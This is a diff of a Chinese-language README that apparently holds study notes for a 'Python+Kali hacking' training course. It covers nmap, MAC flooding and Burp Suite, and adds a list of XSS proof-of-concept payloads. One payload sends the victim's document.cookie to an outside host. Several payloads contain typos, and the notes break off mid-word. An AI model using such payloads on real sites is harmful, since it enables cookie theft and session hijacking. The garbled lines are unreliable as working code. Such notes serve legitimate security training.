@@ -1,4 +1,4 @@
-# 乾颐堂 Python+Kali黑客全套教程
+# [乾颐堂](https://www.qytang.com/) Python+Kali黑客全套教程
 
 ## 0x00 视频 + 源码 + PDF
 
@@ -27,7 +27,7 @@
 
 - python + nmap
 
-  ```
+  ```tex
   # https://pypi.org/project/python-nmap/
   # pip install python-nmap
   # import nmap
@@ -43,13 +43,13 @@
 
 - nexpose api
 
-  ```
+  ```tex
   https://<host>:<port>/api/api-version/xml
   ```
 
 - 协议攻击
 
-  ```
+  ```tex
   mac 泛洪 + mac 欺骗
       macof
       # 防御 port security 技术
@@ -70,3 +70,34 @@
 
 - windows 沙盒探测
 
+
+
+- 工具
+
+  ```tex
+  BurpSuite
+  	Proxy 代理 / Intruder 攻击 / Repeater 重放
+      Comparer 可比较两个不同请求页面的响应区别
+      Spider 手工爬取+自动爬取
+      Scanner 手工+自动
+      Sequencer 自动确认Cookies 随机性
+      Decoder + Extender 编/解码(绕过) + 扩展(WAF 绕过等)
+  ```
+
+- XSS POC & 攻击技巧
+
+  ```tex
+  # 手工改确认
+  	1- 脚本：<script>alert('xss')</script>
+  	2- 超链接：<a href='' onclick=alert('xss')>click it</a>
+  	3- 图片：<img src=http://172.16.1.23/a.jpgg onerror=alert('xss')>
+  	4- 重定向：<script>window.location="http://www.qytphp.com/was/xss.html"</script>
+  	5- iframe：<iframe width=300 height=100 src="http://dvwa.qytang.com/vul/xss_r/?name=<script>window.location='http://www.qytphp.com/was/cookie.php?sid='%2Bdocumet.cookie;</script>"></iframe>
+  	6- DOM：<script>document.body.ierHTML="<div style=visibility.visible;><br/><br/><h1>QYTAG</h1></div>";</script>
+  
+  # 攻击技巧
+  	1- hook
+  	2- ke
+  ```
+
+  
